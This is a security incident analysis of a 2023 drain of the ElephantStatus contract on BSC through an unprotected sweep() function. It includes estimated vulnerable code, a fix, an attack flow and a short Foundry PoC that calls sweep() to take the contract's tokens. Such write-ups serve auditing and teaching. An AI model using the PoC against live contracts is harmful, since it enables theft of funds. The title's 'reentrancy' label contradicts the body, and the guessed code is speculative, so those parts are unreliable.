# ElephantStatus Reentrancy Vulnerability Analysis (December 2023)

## Metadata

| Field | Details |
|------|------|
| Date | 2023-12-03 |
| Protocol | ElephantStatus |
| Chain | BSC |
| Loss | ~$165K |
| Attacker | 0xbbcc139933d1580e7c40442e09263e90e6f1d66d |
| Attack Tx | 0xd423ae0e95e9d6c8a89dcfed243573867e4aad29ee99a9055728cbbe0a523439 |
| Vulnerable Contract | 0x8cf0a553ab3896e4832ebcc519a7a60828ab5740 |
| Root Cause | Token theft via `sweep()` function |
| PoC Source | https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/ElephantStatus_exp.sol |

---

## 1. Vulnerability Overview

The `sweep()` function in the ElephantStatus contract had a missing access control vulnerability, allowing an attacker to arbitrarily withdraw tokens locked in the contract. Approximately $165K worth of assets were stolen.

---

## 2. Vulnerable Code Analysis

### ❌ Vulnerable Code
```solidity
interface IElephantStatus {
    // sweep function callable by anyone
    function sweep() external;
}

// Internal implementation (estimated)
function sweep() external {
    // No access control
    // Transfers all tokens in the contract to the caller
    uint256 balance = token.balanceOf(address(this));
    token.transfer(msg.sender, balance);
}
```

### ✅ Fixed Code
```solidity
function sweep() external onlyOwner {
    // Only callable by owner
    uint256 balance = token.balanceOf(address(this));
    token.transfer(owner(), balance);
    emit Swept(balance);
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Token theft via sweep() function
// Source code unverified — based on bytecode analysis
```

---

## 3. Attack Flow

```
Attacker
  │
  ├─▶ Analyze ElephantStatus contract
  │    └─▶ Discover missing access control on sweep()
  │
  ├─▶ Call sweep() directly
  │    └─▶ Drain all tokens from contract
  │
  └─▶ ~$165K stolen
```

---

## 4. PoC Code (Core Excerpt)

```solidity
function testExploit() external {
    vm.createSelectFork("bsc", 34_095_131);

    uint256 balBefore = token.balanceOf(address(this));

    // Call sweep() — executable by anyone due to missing access control
    IElephantStatus(elephantStatus).sweep();

    uint256 balAfter = token.balanceOf(address(this));
    // ~$165K profit
    console.log("Profit:", balAfter - balBefore);
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| Vulnerability Type | Missing Access Control |
| Attack Vector | Publicly exposed sweep function |
| Impact Scope | All assets in ElephantStatus contract |
| Severity | Critical |

---

## 6. Remediation Recommendations

1. **Access control on sweep()**: Mandatory application of `onlyOwner` or `onlyAdmin` modifier
2. **Emergency withdrawal function audit**: Periodically review all administrative functions
3. **Event logging**: Emit events on large token movements to strengthen monitoring

---

## 7. Lessons Learned

Administrative functions that move assets — such as `sweep()`, `drain()`, and `withdraw()` — must always have proper access controls in place. This case demonstrates how a simple vulnerability led to a $165K loss, underscoring the critical importance of access control audits before contract deployment.